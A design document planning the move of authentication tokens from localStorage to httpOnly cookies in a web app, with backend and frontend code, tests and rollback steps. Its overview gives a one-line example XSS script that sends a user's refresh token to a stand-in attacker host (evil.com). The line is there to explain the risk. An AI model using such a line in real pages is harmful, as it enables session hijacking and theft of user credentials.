# Secure Token Implementation Plan

> **✅ IMPLEMENTED** - Completed on 2026-01-24
>
> All features from this plan have been implemented including:
> - httpOnly cookie storage for refresh tokens
> - In-memory access token storage
> - Silent refresh on page load
> - CSRF protection (double-submit cookie pattern)
> - Token blacklisting on logout
> - Token rotation on refresh
> - Refresh race condition protection

## Overview

### Current Vulnerability: XSS Token Theft

The current authentication implementation stores both access and refresh tokens in `localStorage`:

```javascript
// frontend/src/store/authStore.ts - Current vulnerable code
localStorage.setItem('accessToken', response.accessToken);
localStorage.setItem('refreshToken', response.refreshToken);

// frontend/src/lib/axios.ts - Tokens read from localStorage
const token = localStorage.getItem('accessToken');
const refreshToken = localStorage.getItem('refreshToken');
```

**Why this is dangerous:**

1. **XSS Attack Vector**: Any successful Cross-Site Scripting (XSS) attack allows malicious JavaScript to access `localStorage`
2. **Token Theft**: An attacker can steal both tokens with a simple script: `fetch('https://evil.com?token=' + localStorage.getItem('refreshToken'))`
3. **Long-lived Refresh Token**: The refresh token has a 7-day lifespan, giving attackers extended access
4. **No Server-Side Revocation**: Current logout only clears client-side storage; stolen tokens remain valid
5. **Session Hijacking**: Attacker can use stolen tokens to impersonate the user indefinitely

### Target Architecture

**Secure token handling with defense-in-depth:**

| Token Type | Storage | Transmission | Lifespan |
|------------|---------|--------------|----------|
| Access Token | JavaScript memory (Zustand store) | Authorization header | 15 minutes |
| Refresh Token | httpOnly cookie | Automatic via cookie | 7 days |

**Key Security Improvements:**

1. **httpOnly Cookie**: Refresh token inaccessible to JavaScript, immune to XSS
2. **Memory-only Access Token**: Short-lived, lost on page refresh (acceptable trade-off)
3. **Silent Refresh**: Automatic token refresh on page load using cookie
4. **Secure Cookie Flags**: `httpOnly`, `secure`, `sameSite=strict` prevent various attacks
5. **Server-Side Logout**: Clear cookie and optionally blacklist token

---

## Implementation Phases

### Phase 1: Backend Changes

**Duration**: 1-2 hours

#### 1.1 Add Cookie Configuration to Config

**File**: `/home/user/Captains-Log/backend/src/config/index.ts`

Add cookie configuration options:

```typescript
// Add after jwt config
cookie: {
  secure: process.env.NODE_ENV === 'production', // HTTPS only in production
  sameSite: (process.env.COOKIE_SAME_SITE || 'strict') as 'strict' | 'lax' | 'none',
  domain: process.env.COOKIE_DOMAIN || undefined, // e.g., '.example.com' for subdomains
  path: '/',
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in milliseconds
},
```

#### 1.2 Install Cookie Parser (if not present)

```bash
cd backend
npm install cookie-parser
npm install -D @types/cookie-parser
```

#### 1.3 Add Cookie Parser Middleware

**File**: `/home/user/Captains-Log/backend/src/index.ts`

```typescript
import cookieParser from 'cookie-parser';

// Add after express.json()
app.use(cookieParser());
```

#### 1.4 Create Cookie Utility Functions

**File**: `/home/user/Captains-Log/backend/src/utils/cookies.ts` (NEW FILE)

```typescript
import { Response } from 'express';
import { config } from '../config';

const REFRESH_TOKEN_COOKIE_NAME = 'refreshToken';

export const setRefreshTokenCookie = (res: Response, token: string): void => {
  res.cookie(REFRESH_TOKEN_COOKIE_NAME, token, {
    httpOnly: true,
    secure: config.cookie.secure,
    sameSite: config.cookie.sameSite,
    domain: config.cookie.domain,
    path: config.cookie.path,
    maxAge: config.cookie.maxAge,
  });
};

export const clearRefreshTokenCookie = (res: Response): void => {
  res.clearCookie(REFRESH_TOKEN_COOKIE_NAME, {
    httpOnly: true,
    secure: config.cookie.secure,
    sameSite: config.cookie.sameSite,
    domain: config.cookie.domain,
    path: config.cookie.path,
  });
};

export const getRefreshTokenFromCookie = (cookies: Record<string, string>): string | undefined => {
  return cookies[REFRESH_TOKEN_COOKIE_NAME];
};
```

#### 1.5 Update Auth Controller

**File**: `/home/user/Captains-Log/backend/src/controllers/auth.controller.ts`

**Changes needed:**

1. **Login**: Set refresh token in cookie, return only access token in body
2. **Register**: Set refresh token in cookie, return only access token in body
3. **Refresh**: Read refresh token from cookie (with body fallback for migration)
4. **Logout**: Clear the refresh token cookie

```typescript
import { setRefreshTokenCookie, clearRefreshTokenCookie, getRefreshTokenFromCookie } from '../utils/cookies';

// In register method:
async register(req: Request, res: Response, next: NextFunction) {
  try {
    const validatedData = registerSchema.parse(req.body);
    const result = await authService.register(validatedData);

    // Set refresh token in httpOnly cookie
    setRefreshTokenCookie(res, result.refreshToken);

    logger.info(`New user registered: ${result.user.email}`);

    // Return access token in body (NOT refresh token)
    res.status(201).json({
      status: 'success',
      data: {
        user: result.user,
        accessToken: result.accessToken,
        // Note: refreshToken intentionally omitted from response body
      },
    });
  } catch (error) {
    next(error);
  }
}

// In login method:
async login(req: Request, res: Response, next: NextFunction) {
  try {
    const validatedData = loginSchema.parse(req.body);
    const result = await authService.login(validatedData);

    // Set refresh token in httpOnly cookie
    setRefreshTokenCookie(res, result.refreshToken);

    logger.info(`User logged in: ${result.user.email}`);

    // Return access token in body (NOT refresh token)
    res.status(200).json({
      status: 'success',
      data: {
        user: result.user,
        accessToken: result.accessToken,
        // Note: refreshToken intentionally omitted from response body
      },
    });
  } catch (error) {
    next(error);
  }
}

// In refreshToken method (with backward compatibility):
async refreshToken(req: Request, res: Response, next: NextFunction) {
  try {
    // Try cookie first, fall back to body for migration period
    const refreshToken = getRefreshTokenFromCookie(req.cookies) || req.body.refreshToken;

    if (!refreshToken) {
      throw new AppError('No refresh token provided', 401);
    }

    const result = await authService.refreshToken(refreshToken);

    // Set new refresh token in cookie (token rotation)
    setRefreshTokenCookie(res, result.refreshToken);

    res.status(200).json({
      status: 'success',
      data: {
        accessToken: result.accessToken,
        // Note: refreshToken intentionally omitted from response body
      },
    });
  } catch (error) {
    next(error);
  }
}

// In logout method:
async logout(_req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    // Clear the refresh token cookie
    clearRefreshTokenCookie(res);

    res.status(200).json({
      status: 'success',
      message: 'Logged out successfully',
    });
  } catch (error) {
    next(error);
  }
}
```

#### 1.6 Add Silent Refresh Endpoint

**File**: `/home/user/Captains-Log/backend/src/routes/auth.routes.ts`

Add a dedicated endpoint for silent refresh on page load:

```typescript
/**
 * @openapi
 * /api/auth/silent-refresh:
 *   post:
 *     summary: Silently refresh access token using httpOnly cookie
 *     tags: [Authentication]
 *     description: Used on page load to restore authentication state
 *     responses:
 *       200:
 *         description: Token refreshed, returns user and access token
 *       401:
 *         description: No valid refresh token in cookie
 */
router.post('/silent-refresh', authController.silentRefresh);
```

**Add to controller** (`auth.controller.ts`):

```typescript
async silentRefresh(req: Request, res: Response, next: NextFunction) {
  try {
    const refreshToken = getRefreshTokenFromCookie(req.cookies);

    if (!refreshToken) {
      // No cookie - user is not logged in, this is not an error
      res.status(200).json({
        status: 'success',
        data: null, // Indicates no active session
      });
      return;
    }

    try {
      const result = await authService.refreshToken(refreshToken);
      const decoded = verifyRefreshToken(refreshToken);
      const user = await authService.getCurrentUser(decoded.userId);

      // Set new refresh token in cookie
      setRefreshTokenCookie(res, result.refreshToken);

      res.status(200).json({
        status: 'success',
        data: {
          user,
          accessToken: result.accessToken,
        },
      });
    } catch (error) {
      // Invalid/expired token - clear the bad cookie
      clearRefreshTokenCookie(res);
      res.status(200).json({
        status: 'success',
        data: null,
      });
    }
  } catch (error) {
    next(error);
  }
}
```

#### 1.7 Update CORS Configuration

**File**: `/home/user/Captains-Log/backend/src/index.ts`

Ensure credentials are properly handled:

```typescript
const corsOptions = {
  origin: process.env.CORS_ORIGIN
    ? process.env.CORS_ORIGIN.split(',').map(origin => origin.trim())
    : ['http://localhost:3000', 'http://localhost:5173'],
  credentials: true, // Already present - required for cookies
  exposedHeaders: ['Set-Cookie'], // Allow frontend to see cookie headers
};
```

---

### Phase 2: Frontend Changes

**Duration**: 2-3 hours

#### 2.1 Update Auth Types

**File**: `/home/user/Captains-Log/frontend/src/types/auth.ts`

Update the response type since refresh token is no longer in body:

```typescript
// Update AuthResponse to reflect new API response
export interface AuthResponse {
  user: User;
  accessToken: string;
  // refreshToken removed - now in httpOnly cookie
}

// Keep for backward compatibility during migration
export interface LegacyAuthResponse extends AuthResponse {
  refreshToken?: string;
}
```

#### 2.2 Update Axios Configuration

**File**: `/home/user/Captains-Log/frontend/src/lib/axios.ts`

**Complete rewrite:**

```typescript
import axios from 'axios';
import type { AxiosError, InternalAxiosRequestConfig } from 'axios';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000/api';

// Retry configuration for rate limiting (429) errors
const MAX_RETRIES = 4;
const INITIAL_RETRY_DELAY = 1000;

interface RetryConfig extends InternalAxiosRequestConfig {
  _retryCount?: number;
  _retry?: boolean;
}

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// In-memory token storage (NOT in localStorage)
let accessToken: string | null = null;

// Token getter/setter for use by auth store
export const getAccessToken = (): string | null => accessToken;
export const setAccessToken = (token: string | null): void => {
  accessToken = token;
};

const axiosInstance = axios.create({
  baseURL: API_URL,
  headers: {
    'Content-Type': 'application/json',
  },
  timeout: 120000,
  withCredentials: true, // CRITICAL: Send cookies with requests
});

// Request interceptor - use in-memory token
axiosInstance.interceptors.request.use(
  (config) => {
    if (accessToken) {
      config.headers.Authorization = `Bearer ${accessToken}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response interceptor - handle 401 with cookie-based refresh
axiosInstance.interceptors.response.use(
  (response) => response,
  async (error: AxiosError) => {
    const originalRequest = error.config as RetryConfig;

    if (!originalRequest) {
      return Promise.reject(error);
    }

    // Handle rate limiting (429)
    if (error.response?.status === 429) {
      const retryCount = originalRequest._retryCount || 0;
      if (retryCount < MAX_RETRIES) {
        originalRequest._retryCount = retryCount + 1;
        const retryDelay = INITIAL_RETRY_DELAY * Math.pow(2, retryCount);
        console.log(`Rate limited. Retrying in ${retryDelay}ms (attempt ${retryCount + 1}/${MAX_RETRIES})`);
        await delay(retryDelay);
        return axiosInstance(originalRequest);
      }
    }

    // Handle 401 (Unauthorized) - try cookie-based refresh
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Refresh using cookie (no body needed)
        const { data } = await axios.post(
          `${API_URL}/auth/refresh`,
          {},
          { withCredentials: true }
        );

        const newAccessToken = data.data?.accessToken;
        if (newAccessToken) {
          setAccessToken(newAccessToken);
          originalRequest.headers.Authorization = `Bearer ${newAccessToken}`;
          return axiosInstance(originalRequest);
        }
        throw new Error('No access token in refresh response');
      } catch (refreshError) {
        // Refresh failed - clear token and redirect
        setAccessToken(null);

        // Import dynamically to avoid circular dependency
        const { useAuthStore } = await import('../store/authStore');
        useAuthStore.getState().clearAuth();

        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

export default axiosInstance;
```

#### 2.3 Update Auth Store

**File**: `/home/user/Captains-Log/frontend/src/store/authStore.ts`

**Complete rewrite:**

```typescript
import { create } from 'zustand';
import type { User, LoginInput, RegisterInput } from '../types/auth';
import authService from '../services/auth.service';
import { setAccessToken, getAccessToken } from '../lib/axios';

interface AuthState {
  user: User | null;
  isAuthenticated: boolean;
  isLoading: boolean;
  isInitialized: boolean; // Track if initial auth check is complete
  error: string | null;

  login: (data: LoginInput) => Promise<void>;
  register: (data: RegisterInput) => Promise<void>;
  logout: () => Promise<void>;
  initializeAuth: () => Promise<void>; // Silent refresh on page load
  updateUser: (user: Partial<User>) => void;
  clearError: () => void;
  clearAuth: () => void; // For use by axios interceptor
}

export const useAuthStore = create<AuthState>((set) => ({
  user: null,
  isAuthenticated: false,
  isLoading: false,
  isInitialized: false,
  error: null,

  login: async (data: LoginInput) => {
    set({ isLoading: true, error: null });
    try {
      const response = await authService.login(data);

      // Store access token in memory only
      setAccessToken(response.accessToken);

      set({
        user: response.user,
        isAuthenticated: true,
        isLoading: false,
      });
    } catch (err: unknown) {
      const error = err as { response?: { data?: { message?: string } } };
      const errorMessage = error.response?.data?.message || 'Login failed';
      set({ error: errorMessage, isLoading: false });
      throw err;
    }
  },

  register: async (data: RegisterInput) => {
    set({ isLoading: true, error: null });
    try {
      const response = await authService.register(data);

      // Store access token in memory only
      setAccessToken(response.accessToken);

      set({
        user: response.user,
        isAuthenticated: true,
        isLoading: false,
      });
    } catch (err: unknown) {
      const error = err as { response?: { data?: { message?: string } } };
      const errorMessage = error.response?.data?.message || 'Registration failed';
      set({ error: errorMessage, isLoading: false });
      throw err;
    }
  },

  logout: async () => {
    try {
      await authService.logout();
    } catch (error) {
      console.error('Logout error:', error);
    } finally {
      setAccessToken(null);
      set({
        user: null,
        isAuthenticated: false,
      });
    }
  },

  // Called on app initialization (page load/refresh)
  initializeAuth: async () => {
    set({ isLoading: true });
    try {
      // Try silent refresh using httpOnly cookie
      const result = await authService.silentRefresh();

      if (result) {
        setAccessToken(result.accessToken);
        set({
          user: result.user,
          isAuthenticated: true,
          isLoading: false,
          isInitialized: true,
        });
      } else {
        // No active session
        set({
          user: null,
          isAuthenticated: false,
          isLoading: false,
          isInitialized: true,
        });
      }
    } catch (error) {
      console.error('Auth initialization failed:', error);
      set({
        user: null,
        isAuthenticated: false,
        isLoading: false,
        isInitialized: true,
      });
    }
  },

  updateUser: (updatedFields: Partial<User>) => {
    set((state) => {
      if (!state.user) return state;
      return { user: { ...state.user, ...updatedFields } };
    });
  },

  clearError: () => set({ error: null }),

  clearAuth: () => {
    setAccessToken(null);
    set({
      user: null,
      isAuthenticated: false,
    });
  },
}));
```

#### 2.4 Update Auth Service

**File**: `/home/user/Captains-Log/frontend/src/services/auth.service.ts`

```typescript
import axios from '../lib/axios';
import type { AuthResponse, LoginInput, RegisterInput, User } from '../types/auth';

class AuthService {
  async register(data: RegisterInput): Promise<AuthResponse> {
    const response = await axios.post('/auth/register', data);
    return response.data.data;
  }

  async login(data: LoginInput): Promise<AuthResponse> {
    const response = await axios.post('/auth/login', data);
    return response.data.data;
  }

  async getCurrentUser(): Promise<User> {
    const response = await axios.get('/auth/me');
    return response.data.data;
  }

  async logout(): Promise<void> {
    await axios.post('/auth/logout');
  }

  // New method for silent refresh on page load
  async silentRefresh(): Promise<{ user: User; accessToken: string } | null> {
    try {
      const response = await axios.post('/auth/silent-refresh');
      return response.data.data; // null if no session, { user, accessToken } if valid
    } catch (error) {
      console.error('Silent refresh failed:', error);
      return null;
    }
  }

  // Legacy method - can be removed after migration period
  async refreshToken(): Promise<{ accessToken: string }> {
    const response = await axios.post('/auth/refresh');
    return response.data.data;
  }
}

export default new AuthService();
```

#### 2.5 Update App Initialization

**File**: `/home/user/Captains-Log/frontend/src/App.tsx` (or main entry point)

Add auth initialization on app mount:

```typescript
import { useEffect } from 'react';
import { useAuthStore } from './store/authStore';

function App() {
  const { initializeAuth, isInitialized, isLoading } = useAuthStore();

  useEffect(() => {
    initializeAuth();
  }, [initializeAuth]);

  // Show loading state while checking auth
  if (!isInitialized) {
    return <LoadingSpinner />; // Or skeleton UI
  }

  return (
    // ... rest of app
  );
}
```

#### 2.6 Update Protected Route Component

Ensure protected routes wait for auth initialization:

```typescript
function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const { isAuthenticated, isInitialized, isLoading } = useAuthStore();

  if (!isInitialized || isLoading) {
    return <LoadingSpinner />;
  }

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return <>{children}</>;
}
```

---

### Phase 3: Migration Strategy

**Duration**: Varies based on user base

#### 3.1 Backward Compatibility Period (2-4 weeks recommended)

During migration, support both old and new auth flows:

**Backend changes for compatibility:**

```typescript
// In refreshToken controller - already included in Phase 1
const refreshToken = getRefreshTokenFromCookie(req.cookies) || req.body.refreshToken;
```

**Frontend migration helper:**

```typescript
// frontend/src/utils/authMigration.ts
export const migrateFromLocalStorage = (): void => {
  // Check for old tokens
  const oldAccessToken = localStorage.getItem('accessToken');
  const oldRefreshToken = localStorage.getItem('refreshToken');
  const oldUser = localStorage.getItem('user');

  if (oldAccessToken || oldRefreshToken || oldUser) {
    console.info('Migrating auth from localStorage to secure storage');

    // Clear old storage
    localStorage.removeItem('accessToken');
    localStorage.removeItem('refreshToken');
    localStorage.removeItem('user');

    // User will need to log in again (refresh token now managed server-side)
    // This is acceptable for security migration
  }
};
```

Call this on app initialization:

```typescript
// In App.tsx or main entry point
import { migrateFromLocalStorage } from './utils/authMigration';

useEffect(() => {
  migrateFromLocalStorage();
  initializeAuth();
}, []);
```

#### 3.2 Cleanup Old Tokens

After migration period, remove backward compatibility:

1. Remove `|| req.body.refreshToken` fallback from backend refresh endpoint
2. Remove migration helper from frontend
3. Update API documentation

---

## Files to Modify

### Backend Files

| File | Changes |
|------|---------|
| `backend/src/config/index.ts` | Add cookie configuration options |
| `backend/src/index.ts` | Add cookie-parser middleware |
| `backend/src/utils/cookies.ts` | **NEW FILE** - Cookie utility functions |
| `backend/src/controllers/auth.controller.ts` | Set/clear cookies, add silent-refresh |
| `backend/src/routes/auth.routes.ts` | Add silent-refresh endpoint |
| `backend/src/types/auth.types.ts` | Update response types (optional) |

### Frontend Files

| File | Changes |
|------|---------|
| `frontend/src/lib/axios.ts` | Remove localStorage, add in-memory token, withCredentials |
| `frontend/src/store/authStore.ts` | Remove localStorage, add initializeAuth |
| `frontend/src/services/auth.service.ts` | Add silentRefresh method |
| `frontend/src/types/auth.ts` | Remove refreshToken from AuthResponse |
| `frontend/src/App.tsx` | Add auth initialization on mount |
| `frontend/src/utils/authMigration.ts` | **NEW FILE** - Migration helper |

### Configuration Files

| File | Changes |
|------|---------|
| `.env.example` | Add cookie configuration variables |
| `docker-compose.yml` | Ensure CORS_ORIGIN includes all frontend URLs |

---

## Security Considerations

### CSRF Protection

**Risk**: With cookie-based auth, CSRF attacks become possible.

**Mitigations already in place:**

1. **SameSite=Strict**: Cookies only sent for same-site requests (strongest protection)
2. **Origin checking**: CORS only allows specified origins

**Additional protection (optional):**

```typescript
// Add CSRF token for state-changing requests
// backend/src/middleware/csrf.ts
import crypto from 'crypto';

export const generateCsrfToken = (): string => {
  return crypto.randomBytes(32).toString('hex');
};

// Set CSRF token in a non-httpOnly cookie (readable by JS)
// Require it in X-CSRF-Token header for POST/PUT/DELETE
```

**Recommendation**: With `SameSite=Strict`, additional CSRF protection is optional but can be added for defense-in-depth.

### Cookie Scope

**Configuration options:**

| Setting | Value | Purpose |
|---------|-------|---------|
| `httpOnly` | `true` | Prevent JavaScript access (XSS protection) |
| `secure` | `true` (production) | HTTPS only (prevent interception) |
| `sameSite` | `strict` | Prevent CSRF, only same-site requests |
| `domain` | `.example.com` | Allow subdomains (if needed) |
| `path` | `/` | Cookie sent for all paths |
| `maxAge` | `604800000` | 7 days in milliseconds |

**Production environment considerations:**

```bash
# .env.production
COOKIE_SAME_SITE=strict
COOKIE_DOMAIN=.yourdomain.com  # Only if using subdomains
```

### Token Rotation

**Current implementation**: New refresh token issued on each refresh (already in place).

**Benefits:**

- Limits window of token theft
- Enables detection of token reuse (future enhancement)

**Future enhancement - Token reuse detection:**

```typescript
// Store token family ID and detect if old token is reused
// Indicates token theft - invalidate entire family
```

### Logout Handling

**Current (improved):**

- Frontend: Clear in-memory token, trigger logout API
- Backend: Clear refresh token cookie

**Future enhancement - Token blacklisting:**

```typescript
// backend/src/services/tokenBlacklist.service.ts
// Store invalidated tokens (or their JTI) in Redis/database
// Check blacklist on every request
```

**Trade-off**: Adds latency but enables immediate revocation.

---

## Testing Plan

### Manual Testing Steps

#### Phase 1: Backend Testing (use curl or Postman)

```bash
# 1. Test login - should set cookie
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password"}' \
  -c cookies.txt -v

# Verify: Set-Cookie header with httpOnly flag
# Verify: Response body has accessToken but NOT refreshToken

# 2. Test refresh with cookie
curl -X POST http://localhost:5000/api/auth/refresh \
  -b cookies.txt -v

# Verify: New access token returned
# Verify: New Set-Cookie header (token rotation)

# 3. Test silent-refresh
curl -X POST http://localhost:5000/api/auth/silent-refresh \
  -b cookies.txt -v

# Verify: Returns user and accessToken if valid cookie
# Verify: Returns null if no cookie

# 4. Test logout
curl -X POST http://localhost:5000/api/auth/logout \
  -b cookies.txt \
  -H "Authorization: Bearer <access-token>" -v

# Verify: Cookie cleared (Set-Cookie with maxAge=0 or expires in past)

# 5. Test protected route after logout
curl -X GET http://localhost:5000/api/auth/me \
  -b cookies.txt \
  -H "Authorization: Bearer <old-access-token>"

# Verify: 401 Unauthorized
```

#### Phase 2: Frontend Testing

1. **Fresh Login Test:**
   - Clear all cookies and localStorage
   - Log in
   - Verify: No tokens in localStorage
   - Verify: Cookie set in browser dev tools (httpOnly, so not visible in JS)
   - Verify: User is authenticated

2. **Page Refresh Test:**
   - Log in, then refresh page
   - Verify: User remains authenticated (silent refresh worked)
   - Verify: No loading flash or redirect to login

3. **Token Expiry Test:**
   - Log in
   - Wait 15+ minutes (or temporarily reduce access token expiry)
   - Make an API request
   - Verify: Request succeeds (auto-refresh worked)

4. **Logout Test:**
   - Log in
   - Click logout
   - Verify: Redirected to login
   - Refresh page
   - Verify: Not authenticated (cookie was cleared)

5. **XSS Simulation Test:**
   - Log in
   - Open browser console
   - Try: `localStorage.getItem('accessToken')` - should be null
   - Try: `localStorage.getItem('refreshToken')` - should be null
   - Try: `document.cookie` - should NOT contain refreshToken (httpOnly)
   - Verify: Tokens are not accessible to JavaScript

### Edge Cases to Verify

| Scenario | Expected Behavior |
|----------|-------------------|
| Multiple tabs open | All tabs share auth state via cookie |
| Browser restart | Silent refresh restores session |
| Expired refresh token | Redirect to login |
| Invalid refresh token | Clear cookie, redirect to login |
| Network error during refresh | Retry or graceful degradation |
| Concurrent requests during refresh | Only one refresh, others wait |
| CORS mismatch | Cookie not sent, 401 error |
| Mixed HTTP/HTTPS | Cookie not sent if `secure=true` on HTTP |

### Automated Testing

```typescript
// backend/__tests__/auth.cookie.test.ts
describe('Cookie-based Authentication', () => {
  it('should set httpOnly cookie on login', async () => {
    const response = await request(app)
      .post('/api/auth/login')
      .send({ email: 'test@example.com', password: 'password' });

    expect(response.status).toBe(200);
    expect(response.body.data.accessToken).toBeDefined();
    expect(response.body.data.refreshToken).toBeUndefined();

    const cookies = response.headers['set-cookie'];
    expect(cookies).toBeDefined();
    expect(cookies[0]).toContain('httpOnly');
    expect(cookies[0]).toContain('refreshToken=');
  });

  it('should refresh using cookie', async () => {
    // Login to get cookie
    const loginResponse = await request(app)
      .post('/api/auth/login')
      .send({ email: 'test@example.com', password: 'password' });

    const cookie = loginResponse.headers['set-cookie'][0];

    // Refresh using cookie
    const refreshResponse = await request(app)
      .post('/api/auth/refresh')
      .set('Cookie', cookie);

    expect(refreshResponse.status).toBe(200);
    expect(refreshResponse.body.data.accessToken).toBeDefined();
  });

  it('should clear cookie on logout', async () => {
    // ... login and get cookie ...

    const logoutResponse = await request(app)
      .post('/api/auth/logout')
      .set('Authorization', `Bearer ${accessToken}`)
      .set('Cookie', cookie);

    expect(logoutResponse.status).toBe(200);
    const cookies = logoutResponse.headers['set-cookie'];
    expect(cookies[0]).toMatch(/refreshToken=;|Max-Age=0|expires=Thu, 01 Jan 1970/);
  });
});
```

---

## Rollback Plan

### If Issues Arise After Deployment

#### Immediate Rollback (< 5 minutes)

1. **Revert frontend deployment:**
   ```bash
   # Revert to previous frontend image
   docker-compose -f docker-compose.prod.yml pull frontend:previous-tag
   docker-compose -f docker-compose.prod.yml up -d frontend
   ```

2. **Backend is backward compatible** - can stay deployed since it supports both cookie and body refresh tokens.

#### Full Rollback (< 15 minutes)

1. **Revert both services:**
   ```bash
   # Update docker-compose.prod.yml to use previous versions
   docker-compose -f docker-compose.prod.yml pull
   docker-compose -f docker-compose.prod.yml up -d
   ```

2. **Users may need to log in again** (expected behavior during rollback).

### Rollback Decision Criteria

| Symptom | Severity | Action |
|---------|----------|--------|
| Login fails for all users | Critical | Immediate rollback |
| Silent refresh not working | High | Debug, rollback if > 1 hour |
| Token refresh loop | High | Immediate rollback |
| Cookie not being set | Medium | Debug CORS/cookie settings |
| Single user affected | Low | Debug individual case |

### Rollback Verification

After rollback:

1. Test login flow works
2. Test token refresh works
3. Test logout works
4. Monitor error logs for auth-related errors

---

## Implementation Checklist

### Pre-Implementation

- [ ] Review this plan with team
- [ ] Set up test environment
- [ ] Back up current deployment

### Phase 1: Backend

- [ ] Install cookie-parser
- [ ] Add cookie configuration to config
- [ ] Add cookie-parser middleware
- [ ] Create cookie utility functions
- [ ] Update auth controller (login, register, refresh, logout)
- [ ] Add silent-refresh endpoint
- [ ] Test all endpoints with curl
- [ ] Run existing tests

### Phase 2: Frontend

- [ ] Update axios configuration
- [ ] Update auth store
- [ ] Update auth service
- [ ] Update App initialization
- [ ] Add migration helper
- [ ] Test login/logout flow
- [ ] Test page refresh
- [ ] Test token expiry and refresh

### Phase 3: Deployment

- [ ] Deploy to staging
- [ ] Full regression test
- [ ] Deploy backend to production
- [ ] Deploy frontend to production
- [ ] Monitor error logs

### Phase 4: Cleanup (after migration period)

- [ ] Remove backward compatibility code
- [ ] Remove migration helper
- [ ] Update documentation

---

## References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookie Attribute](https://web.dev/samesite-cookies-explained/)
